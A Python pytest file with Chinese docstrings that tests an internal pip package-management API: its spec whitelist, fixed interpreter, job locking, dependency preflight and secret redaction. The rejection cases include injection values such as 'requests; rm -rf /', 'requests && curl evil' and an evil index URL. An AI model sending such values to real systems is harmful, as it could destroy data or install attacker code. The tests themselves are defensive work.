"""``/internal/deps/*`` 契约测试。

锁死四件事，每件都对应一个"顺手改坏就会变成安全事件"的点：

1. **规格白名单**：空格 / 分号 / ``-r`` / URL / 路径 / extras 一律 400，且**不会**触达 pip
   （否则 ``pip install -r .env`` 会把密钥文件当需求清单读出来）；
2. **解释器固定**：命令永远是 ``sys.executable -m pip``，并带
   ``--no-input --disable-pip-version-check``（没有 TTY 的后台任务不能被 prompt 挂住）；
3. **`pip list` 解析**：容忍 pip 打印在 JSON 前后的 warning，坏输出必须报错而不是
   "返回空列表"（后者会让页面显示"没有安装任何包"）；
4. **单任务互斥**：安装任务在跑时再提交（安装或卸载）返回 409，不排队 ——
   并发改同一个 site-packages 会互相破坏半装的包。
"""

from __future__ import annotations

import asyncio
import json
import sys
from typing import Any

import pytest
from fastapi import HTTPException
from httpx import ASGITransport, AsyncClient

import app.api.deps as deps_api
from app.api.deps import (
    build_pip_command,
    parse_pip_list,
    validate_package_name,
    validate_pip_spec,
)
from app.config import settings
from app.main import create_app

BASE = "/internal/deps"


@pytest.fixture(autouse=True)
def _reset_deps_state(monkeypatch, tmp_path):
    """每个用例都从"没有任务、没有缓存、空快照目录"开始。

    模块级全局（``_jobs`` / ``_running_job_id`` / ``_pypi_cache``）不清会串味：
    上一个用例留下的 job 会让下一个用例的 install 直接被判 409。
    ``data_dir`` 必须指到 tmp_path：install/uninstall 现在会先落一份快照，
    不隔离就会往仓库的 ``data/`` 里写测试垃圾。
    """
    monkeypatch.setattr(deps_api, "_jobs", {})
    monkeypatch.setattr(deps_api, "_running_job_id", None)
    monkeypatch.setattr(deps_api, "_pypi_cache", {})
    monkeypatch.setattr(settings, "data_dir", str(tmp_path))
    yield


def _client() -> AsyncClient:
    return AsyncClient(transport=ASGITransport(app=create_app()), base_url="http://test")


# ── 规格校验（纯函数）─────────────────────────────────────────────────────


class TestValidatePipSpec:
    @pytest.mark.parametrize(
        "spec",
        [
            "requests",
            "requests==2.31.0",
            "requests>=2.31",
            "requests<=2.0",
            "requests!=1.0",
            "requests~=2.0",
            "requests>2",
            "requests<3",
            "requests==2.*",
            "Pillow",
            "my-pkg_1.0",
            "zope.interface==5.0.0",
        ],
    )
    def test_accepts_plain_name_and_single_constraint(self, spec: str) -> None:
        assert validate_pip_spec(spec) == spec

    @pytest.mark.parametrize(
        "spec",
        [
            "requests; rm -rf /",
            "requests && curl evil",
            "requests|whoami",
            "requests`id`",
            "requests==2.0 --index-url http://evil/simple",
            "requests[security]",
            "git+https://evil/x.git",
            "https://evil/x.whl",
            "http://evil",
            "-r requirements.txt",
            "--requirement=requirements.txt",
            "-e .",
            ".env",
            ".",
            "..",
            "pkg.",
            "pkg-",
            "../escape",
            "pkg/sub",
            "pkg\\sub",
            "pkg==1.0,<2",
            "pkg >=2",
            "pkg==",
            "pkg==2.0\nother",
            "包名",
            "",
            "   ",
        ],
    )
    def test_rejects_injection_shapes(self, spec: str) -> None:
        with pytest.raises(ValueError):
            validate_pip_spec(spec)

    def test_pip_spec_ok_matches_validator(self) -> None:
        assert deps_api.pip_spec_ok("requests==2.31.0")
        assert not deps_api.pip_spec_ok(".env")
        assert not deps_api.pip_spec_ok("pkg; id")

    def test_rejects_overlong(self) -> None:
        with pytest.raises(ValueError):
            validate_pip_spec("a" * (deps_api.MAX_SPEC_LEN + 1))

    def test_strips_surrounding_whitespace(self) -> None:
        assert validate_pip_spec("  requests==2.31.0  ") == "requests==2.31.0"


class TestValidatePackageName:
    @pytest.mark.parametrize("name", ["requests", "Pillow", "my-pkg_1.0", "zope.interface"])
    def test_accepts(self, name: str) -> None:
        assert validate_package_name(name) == name

    @pytest.mark.parametrize(
        "name",
        [
            "requests==2.31",
            "requests>=2",
            "requests; id",
            "-r req.txt",
            ".env",
            "../x",
            "a/b",
            "trailing-",
            "pkg name",
            "pkg\nname",
            "",
        ],
    )
    def test_rejects(self, name: str) -> None:
        with pytest.raises(ValueError):
            validate_package_name(name)


# ── 命令构造 / pip list 解析 ─────────────────────────────────────────────


def test_build_pip_command_uses_current_interpreter() -> None:
    cmd = build_pip_command(["list", "--format=json"])
    assert cmd[0] == sys.executable, "必须用当前引擎解释器，不能用 PATH 上的 pip"
    assert cmd[1:3] == ["-m", "pip"]
    assert cmd[3:] == ["list", "--format=json"]


class TestParsePipList:
    def test_parses_sorted_and_deduped(self) -> None:
        payload = json.dumps(
            [
                {"name": "Requests", "version": "2.31.0"},
                {"name": "fastapi", "version": "0.115.0"},
                {"name": "requests", "version": "2.31.0"},
            ]
        )
        assert parse_pip_list(payload) == [
            {"name": "fastapi", "version": "0.115.0"},
            {"name": "Requests", "version": "2.31.0"},
        ]

    def test_tolerates_warnings_around_json(self) -> None:
        payload = (
            "WARNING: pip is being invoked by an old script wrapper.\n"
            '[{"name": "pip", "version": "25.0"}]\n'
            "DEPRECATION: something\n"
        )
        assert parse_pip_list(payload) == [{"name": "pip", "version": "25.0"}]

    def test_drops_entries_without_version(self) -> None:
        payload = json.dumps([{"name": "broken"}, {"name": "ok", "version": "1.0"}])
        assert parse_pip_list(payload) == [{"name": "ok", "version": "1.0"}]

    @pytest.mark.parametrize("payload", ["", "no json here", "[not json]", '{"name":"x"}'])
    def test_bad_output_raises(self, payload: str) -> None:
        with pytest.raises(ValueError):
            parse_pip_list(payload)


# ── 鉴权 ─────────────────────────────────────────────────────────────────


class _FakeRequest:
    """只实现 ``require_internal_token`` 用到的那一小块 Request 接口。"""

    def __init__(self, headers: dict[str, str]):
        self.headers = headers


def test_require_internal_token_fails_closed_when_unconfigured(monkeypatch) -> None:
    monkeypatch.setattr(settings, "internal_token", "")
    with pytest.raises(HTTPException) as exc:
        deps_api.require_internal_token(_FakeRequest({"X-Internal-Token": "anything"}))
    assert exc.value.status_code == 503


def test_require_internal_token_rejects_wrong_value(monkeypatch) -> None:
    monkeypatch.setattr(settings, "internal_token", "correct-token")
    with pytest.raises(HTTPException) as exc:
        deps_api.require_internal_token(_FakeRequest({"X-Internal-Token": "wrong-token"}))
    assert exc.value.status_code == 401
    with pytest.raises(HTTPException):
        deps_api.require_internal_token(_FakeRequest({}))


def test_require_internal_token_accepts_configured_value(monkeypatch) -> None:
    monkeypatch.setattr(settings, "internal_token", "correct-token")
    deps_api.require_internal_token(_FakeRequest({"X-Internal-Token": "correct-token"}))


async def test_http_without_internal_token_is_rejected() -> None:
    """经 ASGI 走一遍：没有（或错的）内部 token 一律 401/403，绝不进入业务逻辑。"""
    async with _client() as client:
        for path in (f"{BASE}/list", f"{BASE}/search?q=requests"):
            resp = await client.get(path, headers={"X-Internal-Token": "definitely-wrong"})
            assert resp.status_code in (401, 403), (path, resp.status_code, resp.text)


# ── /list ────────────────────────────────────────────────────────────────


async def test_list_returns_pip_packages(monkeypatch) -> None:
    calls: list[list[str]] = []

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        calls.append(args)
        return deps_api.PipResult(ok=True, returncode=0, output='[{"name":"fastapi","version":"0.115.0"}]')

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.get(f"{BASE}/list")
    assert resp.status_code == 200
    body = resp.json()
    assert body["packages"] == [{"name": "fastapi", "version": "0.115.0"}]
    assert body["count"] == 1
    assert body["python"] == sys.version.split()[0]
    # 命令形态：pip list --format=json（不能是 pip freeze：没有版本解析需求但需要 JSON）
    assert calls and calls[0][:3] == ["list", "--format=json", "--disable-pip-version-check"]


async def test_list_surfaces_pip_failure(monkeypatch) -> None:
    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        return deps_api.PipResult(ok=False, returncode=2, output="boom")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.get(f"{BASE}/list")
    assert resp.status_code == 502
    assert "exited with code 2" in json.dumps(resp.json())


async def test_list_rejects_unparseable_output(monkeypatch) -> None:
    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        return deps_api.PipResult(ok=True, returncode=0, output="not json at all")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.get(f"{BASE}/list")
    assert resp.status_code == 502


# ── /search ──────────────────────────────────────────────────────────────


async def test_search_returns_pypi_metadata_and_caches(monkeypatch) -> None:
    lookups: list[str] = []

    async def fake_lookup(name: str) -> dict[str, Any]:
        lookups.append(name)
        return {
            "query": name,
            "results": [
                {
                    "name": "requests",
                    "version": "2.32.3",
                    "summary": "Python HTTP for Humans.",
                    "requires_python": ">=3.8",
                    "homepage": "https://requests.readthedocs.io",
                }
            ],
            "count": 1,
            "found": True,
        }

    monkeypatch.setattr(deps_api, "_lookup_pypi", fake_lookup)

    async with _client() as client:
        first = await client.get(f"{BASE}/search", params={"q": "requests"})
        second = await client.get(f"{BASE}/search", params={"q": "requests"})

    assert first.status_code == 200
    body = first.json()
    assert body["results"][0]["version"] == "2.32.3"
    assert body["cached"] is False
    # 60s 缓存：第二次不再打 PyPI
    assert second.json()["cached"] is True
    assert lookups == ["requests"]


async def test_search_not_found_is_not_an_error(monkeypatch) -> None:
    async def fake_lookup(name: str) -> dict[str, Any]:
        return {"query": name, "results": [], "count": 0, "found": False}

    monkeypatch.setattr(deps_api, "_lookup_pypi", fake_lookup)

    async with _client() as client:
        resp = await client.get(f"{BASE}/search", params={"q": "definitely-not-a-real-package-xyz"})
    assert resp.status_code == 200
    assert resp.json()["found"] is False
    assert resp.json()["results"] == []


async def test_search_network_failure_is_explicit(monkeypatch) -> None:
    import httpx

    async def fake_lookup(name: str) -> dict[str, Any]:
        raise httpx.ConnectError("name resolution failed")

    monkeypatch.setattr(deps_api, "_lookup_pypi", fake_lookup)

    async with _client() as client:
        resp = await client.get(f"{BASE}/search", params={"q": "requests"})
    assert resp.status_code == 502
    assert "unreachable" in resp.json()["detail"]


async def test_search_broken_proxy_env_is_not_a_500(monkeypatch) -> None:
    """实测：畸形的 ``*_PROXY`` 会让 httpx 在建 client 时抛 ``InvalidURL``。

    它不是 ``HTTPError`` 的子类，所以"只捕 HTTPError"会把它漏成 500 —— 用户看到
    "内部错误"，而真实原因是本机代理配置坏了。所有失败形态都必须转成 502 + 原因。
    """
    import httpx

    async def fake_lookup(name: str) -> dict[str, Any]:
        raise httpx.InvalidURL("Invalid port: ':1]'")

    monkeypatch.setattr(deps_api, "_lookup_pypi", fake_lookup)

    async with _client() as client:
        resp = await client.get(f"{BASE}/search", params={"q": "requests"})
    assert resp.status_code == 502
    detail = resp.json()["detail"]
    assert "unreachable" in detail
    assert "InvalidURL" in detail


async def test_search_rejects_non_name_query(monkeypatch) -> None:
    async def fake_lookup(name: str) -> dict[str, Any]:  # pragma: no cover - 不应被调用
        raise AssertionError("非法 q 不应触达 PyPI")

    monkeypatch.setattr(deps_api, "_lookup_pypi", fake_lookup)

    async with _client() as client:
        resp = await client.get(f"{BASE}/search", params={"q": "requests; rm -rf /"})
    assert resp.status_code == 400


# ── PyPI 响应解析 / 代理回退 ────────────────────────────────────────────


class _FakePypiResponse:
    """只实现 `_lookup_pypi` 用到的那几个属性。"""

    def __init__(self, status_code: int, payload: Any = None):
        import httpx

        self.status_code = status_code
        self._payload = payload
        self.request = httpx.Request("GET", "https://pypi.org/pypi/requests/json")

    def json(self) -> Any:
        return self._payload

    def raise_for_status(self) -> None:
        import httpx

        if self.status_code >= 400:
            raise httpx.HTTPStatusError(
                f"status {self.status_code}",
                request=self.request,
                response=self,  # type: ignore[arg-type]
            )


async def test_lookup_pypi_parses_metadata(monkeypatch) -> None:
    async def fake_fetch(url: str) -> Any:
        assert url.endswith("/pypi/requests/json")
        return _FakePypiResponse(
            200,
            {
                "info": {
                    "name": "requests",
                    "version": "2.32.3",
                    "summary": "Python HTTP for Humans.",
                    "requires_python": ">=3.8",
                    "home_page": "https://requests.readthedocs.io",
                }
            },
        )

    monkeypatch.setattr(deps_api, "_fetch_pypi", fake_fetch)

    result = await deps_api._lookup_pypi("requests")
    assert result["found"] is True
    assert result["count"] == 1
    assert result["results"][0]["version"] == "2.32.3"
    assert result["results"][0]["summary"] == "Python HTTP for Humans."


async def test_lookup_pypi_not_found_is_ok(monkeypatch) -> None:
    async def fake_fetch(url: str) -> Any:
        return _FakePypiResponse(404)

    monkeypatch.setattr(deps_api, "_fetch_pypi", fake_fetch)

    result = await deps_api._lookup_pypi("nope-zzz")
    assert result == {"query": "nope-zzz", "results": [], "count": 0, "found": False}


async def test_lookup_pypi_server_error_propagates(monkeypatch) -> None:
    import httpx

    async def fake_fetch(url: str) -> Any:
        return _FakePypiResponse(503)

    monkeypatch.setattr(deps_api, "_fetch_pypi", fake_fetch)

    with pytest.raises(httpx.HTTPStatusError):
        await deps_api._lookup_pypi("requests")


async def test_fetch_pypi_falls_back_when_proxy_env_is_broken(monkeypatch) -> None:
    """注册表里畸形的代理项会让共享 client 在建连前就抛 ``InvalidURL`` ⇒ 直连回退。"""
    import httpx

    class BoomCM:
        async def __aenter__(self) -> Any:
            raise httpx.InvalidURL("Invalid port: ':1]'")

        async def __aexit__(self, *args: Any) -> bool:
            return False

    monkeypatch.setattr(deps_api, "shared_client", lambda **kwargs: BoomCM())

    sentinel = _FakePypiResponse(200, {"info": {"name": "requests"}})
    created: dict[str, Any] = {}

    class FakeClient:
        def __init__(self, **kwargs: Any):
            created.update(kwargs)

        async def __aenter__(self) -> FakeClient:
            return self

        async def __aexit__(self, *args: Any) -> bool:
            return False

        async def get(self, url: str, headers: dict[str, str] | None = None) -> Any:
            return sentinel

    monkeypatch.setattr(deps_api.httpx, "AsyncClient", FakeClient)

    resp = await deps_api._fetch_pypi("https://pypi.org/pypi/requests/json")
    assert resp is sentinel
    assert created.get("trust_env") is False


# ── /install ─────────────────────────────────────────────────────────────


async def test_install_rejects_injection_without_running_pip(monkeypatch) -> None:
    ran: list[list[str]] = []

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        ran.append(args)
        return deps_api.PipResult(ok=True, returncode=0, output="")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.post(f"{BASE}/install", json={"spec": "requests; rm -rf /"})
    assert resp.status_code == 400
    assert ran == []
    assert deps_api._jobs == {}


async def test_install_runs_whitelisted_pip_command(monkeypatch) -> None:
    seen: list[list[str]] = []
    finished = asyncio.Event()

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        seen.append(args)
        finished.set()
        return deps_api.PipResult(ok=True, returncode=0, output="Successfully installed requests\n")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.post(f"{BASE}/install", json={"spec": "requests==2.31.0"})
        assert resp.status_code == 200
        job = resp.json()["job"]
        assert job["status"] in ("queued", "running", "succeeded")

        await asyncio.wait_for(finished.wait(), timeout=5)
        for _ in range(100):
            polled = await client.get(f"{BASE}/jobs/{job['id']}")
            if polled.json()["status"] in ("succeeded", "failed"):
                break
            await asyncio.sleep(0.01)

    assert polled.status_code == 200
    assert polled.json()["status"] == "succeeded"
    assert polled.json()["progress"] == 100
    # 变更成功 ⇒ 进程里仍是旧模块，必须提示重启才生效
    assert polled.json()["restart_required"] is True
    # 白名单命令：install + 两个必需 flag + 规格，一次一个参数（不拼 shell）。
    # `check` 是动手前的冲突前置检，`list` 是安装前的自动快照（见
    # `_snapshot_before_mutation`）—— 两者都不带安装规格。
    assert [args for args in seen if args[0] not in ("list", "check")] == [
        ["install", "--no-input", "--disable-pip-version-check", "requests==2.31.0"]
    ]
    # 前置检必须发生在真正的安装之前
    assert seen[0] == ["check"]
    # 自动快照发生在任何安装动作之前：这是"装坏了能回去"的唯一保证
    assert [args for args in seen if args[0] == "list"][0][:2] == ["list", "--format=json"]


async def test_install_is_mutually_exclusive(monkeypatch) -> None:
    started = asyncio.Event()
    release = asyncio.Event()

    async def slow_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        # `pip check` 是前置检，不参与"任务在跑"的模拟（它本身就是同步的）。
        if args[0] == "check":
            return deps_api.PipResult(ok=True, returncode=0, output="")
        started.set()
        await release.wait()
        return deps_api.PipResult(ok=True, returncode=0, output="")

    monkeypatch.setattr(deps_api, "_run_pip", slow_run)

    async with _client() as client:
        first = await client.post(f"{BASE}/install", json={"spec": "requests"})
        assert first.status_code == 200
        await asyncio.wait_for(started.wait(), timeout=5)

        second = await client.post(f"{BASE}/install", json={"spec": "httpx"})
        assert second.status_code == 409
        assert second.json()["detail"]["job_id"] == first.json()["job"]["id"]

        uninstall = await client.post(f"{BASE}/uninstall", json={"name": "requests"})
        assert uninstall.status_code == 409

        release.set()
        for _ in range(100):
            polled = await client.get(f"{BASE}/jobs/{first.json()['job']['id']}")
            if polled.json()["status"] == "succeeded":
                break
            await asyncio.sleep(0.01)


async def test_install_failure_is_reported_on_job(monkeypatch) -> None:
    async def failing_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        # 前置检通过（环境本身没冲突），真正的 install 才失败。
        if args[0] == "check":
            return deps_api.PipResult(ok=True, returncode=0, output="")
        return deps_api.PipResult(ok=False, returncode=1, output="ERROR: No matching distribution\n")

    monkeypatch.setattr(deps_api, "_run_pip", failing_run)

    async with _client() as client:
        resp = await client.post(f"{BASE}/install", json={"spec": "nope-nope-nope==9.9.9"})
        job_id = resp.json()["job"]["id"]
        for _ in range(100):
            polled = await client.get(f"{BASE}/jobs/{job_id}")
            if polled.json()["status"] == "failed":
                break
            await asyncio.sleep(0.01)

    body = polled.json()
    assert body["status"] == "failed"
    assert body["returncode"] == 1
    assert "No matching distribution" in body["output"]


async def test_unknown_job_returns_404() -> None:
    async with _client() as client:
        resp = await client.get(f"{BASE}/jobs/does-not-exist")
    assert resp.status_code == 404


# ── /uninstall ───────────────────────────────────────────────────────────


async def test_uninstall_uses_yes_and_validates_name(monkeypatch) -> None:
    seen: list[list[str]] = []

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        seen.append(args)
        return deps_api.PipResult(ok=True, returncode=0, output="Successfully uninstalled requests\n")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        ok = await client.post(f"{BASE}/uninstall", json={"name": "requests"})
        bad_spec = await client.post(f"{BASE}/uninstall", json={"name": "requests>=2"})
        bad_path = await client.post(f"{BASE}/uninstall", json={"name": "../etc"})
        bad_flag = await client.post(f"{BASE}/uninstall", json={"name": "-r requirements.txt"})

    assert ok.status_code == 200
    assert ok.json()["ok"] is True
    # 卸载同样是"环境已变"：必须告诉前端挂重启横幅
    assert ok.json()["restart_required"] is True
    # 卸载前先 `list` 一份快照（自动快照），再执行白名单卸载命令
    assert seen[0][:2] == ["list", "--format=json"]
    assert [args for args in seen if args[0] != "list"] == [
        ["uninstall", "--yes", "--no-input", "--disable-pip-version-check", "requests"]
    ]
    for rejected in (bad_spec, bad_path, bad_flag):
        assert rejected.status_code == 400


async def test_uninstall_failure_returns_502(monkeypatch) -> None:
    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        return deps_api.PipResult(ok=False, returncode=1, output="WARNING: Skipping requests\n")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.post(f"{BASE}/uninstall", json={"name": "requests"})
    assert resp.status_code == 502
    assert "exited with code 1" in json.dumps(resp.json())


# ── 变更前置检（pip check）──────────────────────────────────────────────


async def test_install_blocks_on_dependency_conflicts(monkeypatch) -> None:
    """环境已有冲突时，install 必须**同步**返回 409 + 冲突文本，而不是排队一个注定失败的任务。"""
    ran: list[list[str]] = []

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        ran.append(args)
        assert args == ["check"], f"冲突时不该继续执行 {args}"
        return deps_api.PipResult(
            ok=False,
            returncode=1,
            output="requests 2.31.0 has requirement urllib3<2, but you have urllib3 2.0.7.\n",
        )

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.post(f"{BASE}/install", json={"spec": "requests==2.31.0"})

    assert resp.status_code == 409
    detail = resp.json()["detail"]
    assert "urllib3" in detail["conflicts"]
    assert "pip check" in detail["hint"]
    assert ran == [["check"]]
    assert deps_api._jobs == {}
    # 闸必须还回去，否则之后的每一次安装都会 409
    assert deps_api._running_job_id is None


async def test_conflict_text_is_redacted_and_gate_is_reusable(monkeypatch) -> None:
    """冲突文本里的索引 URL 凭据必须脱敏；阻塞一次不代表永久阻塞。"""
    state = {"conflict": True}

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        if args[0] == "check":
            if state["conflict"]:
                return deps_api.PipResult(
                    ok=False,
                    returncode=1,
                    output=(
                        "Looking in indexes: https://user:sekret-token@pypi.example.com/simple\n"
                        "pkg 1.0 has requirement dep<2, but you have dep 3.0.\n"
                    ),
                )
            return deps_api.PipResult(ok=True, returncode=0, output="")
        if args[0] == "list":
            return deps_api.PipResult(
                ok=True,
                returncode=0,
                output=json.dumps([{"name": "requests", "version": "2.31.0"}]),
            )
        return deps_api.PipResult(ok=True, returncode=0, output="")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        blocked = await client.post(f"{BASE}/install", json={"spec": "requests==2.31.0"})
        assert blocked.status_code == 409
        conflicts = blocked.json()["detail"]["conflicts"]
        assert "sekret-token" not in conflicts
        assert "https://***@pypi.example.com/simple" in conflicts

        # 冲突修好之后，同一端点必须能继续工作（闸没有被锁死）
        state["conflict"] = False
        again = await client.post(f"{BASE}/install", json={"spec": "requests==2.31.0"})
        assert again.status_code == 200
        job_id = again.json()["job"]["id"]
        for _ in range(100):
            polled = await client.get(f"{BASE}/jobs/{job_id}")
            if polled.json()["status"] in ("succeeded", "failed"):
                break
            await asyncio.sleep(0.01)


async def test_install_preflight_timeout_does_not_block(monkeypatch) -> None:
    """``pip check`` 超时属于"无法判定"，不能当成"有冲突"把功能锁死。"""
    seen: list[list[str]] = []

    async def fake_run(args: list[str], *, timeout: float, on_line: Any = None) -> deps_api.PipResult:
        seen.append(args)
        if args[0] == "check":
            # 超时：pip 被 kill，ok=False 但 timed_out=True
            return deps_api.PipResult(ok=False, returncode=-9, output="", timed_out=True)
        if args[0] == "list":
            return deps_api.PipResult(
                ok=True,
                returncode=0,
                output=json.dumps([{"name": "requests", "version": "2.31.0"}]),
            )
        return deps_api.PipResult(ok=True, returncode=0, output="")

    monkeypatch.setattr(deps_api, "_run_pip", fake_run)

    async with _client() as client:
        resp = await client.post(f"{BASE}/install", json={"spec": "requests==2.31.0"})
        assert resp.status_code == 200
        job_id = resp.json()["job"]["id"]
        for _ in range(100):
            polled = await client.get(f"{BASE}/jobs/{job_id}")
            if polled.json()["status"] in ("succeeded", "failed"):
                break
            await asyncio.sleep(0.01)

    assert polled.json()["status"] == "succeeded"
    assert ["install", "--no-input", "--disable-pip-version-check", "requests==2.31.0"] in seen


def test_check_dependency_conflicts_reports_timeout_separately() -> None:
    """纯函数口径：超时 ⇒ ok=True + timed_out=True（不携带冲突文本）。"""
    check = deps_api.ConflictCheck(ok=True, output="", timed_out=True)
    assert check.ok and check.timed_out


# ── 输出脱敏 ─────────────────────────────────────────────────────────────


def test_redact_output_masks_url_credentials() -> None:
    raw = "Looking in indexes: https://user:secret-token@pypi.example.com/simple"
    assert "secret-token" not in deps_api.redact_output(raw)
    assert "https://***@pypi.example.com/simple" in deps_api.redact_output(raw)


def test_pip_env_excludes_secrets(monkeypatch) -> None:
    """pip 子进程**不能**拿到引擎的密钥类环境变量（它们可能出现在 pip 报错里）。"""
    monkeypatch.setenv("JWT_SECRET", "s" * 40)
    monkeypatch.setenv("INTERNAL_TOKEN", "i" * 40)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test")
    env = deps_api._pip_env()
    for leaked in ("JWT_SECRET", "INTERNAL_TOKEN", "OPENAI_API_KEY"):
        assert leaked not in env
    assert env["PIP_NO_INPUT"] == "1"
    assert env["PIP_DISABLE_PIP_VERSION_CHECK"] == "1"
